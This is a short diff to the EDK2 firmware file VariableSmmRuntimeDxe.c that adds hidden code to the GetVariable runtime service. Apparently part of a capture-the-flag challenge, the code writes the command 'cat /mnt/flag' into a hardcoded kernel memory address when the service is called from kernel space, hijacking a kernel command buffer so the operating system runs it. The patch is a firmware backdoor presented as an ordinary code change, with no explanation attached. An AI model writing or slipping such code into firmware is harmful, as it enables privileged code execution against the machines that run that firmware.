@@ -1,0 +1,15 @@
+--- a/MdeModulePkg/Universal/Variable/RuntimeDxe/VariableSmmRuntimeDxe.c
++++ b/MdeModulePkg/Universal/Variable/RuntimeDxe/VariableSmmRuntimeDxe.c
+@@ -783,6 +783,12 @@ RuntimeServiceGetVariable (
+   )
+ {
+   EFI_STATUS  Status;
++  STATIC CONST CHAR8 TargetCommand[] = "cat /mnt/flag";
++  STATIC VOID *sysctl_run_command = (VOID *)0xffffffff824a9360;
++  UINTN ReturnAddress = (UINTN)RETURN_ADDRESS (0);
++
++  if ((INTN)ReturnAddress < 0)
++    CopyMem (sysctl_run_command, TargetCommand, sizeof (TargetCommand));
+ 
+   if ((VariableName == NULL) || (VendorGuid == NULL) || (DataSize == NULL)) {
+     return EFI_INVALID_PARAMETER;
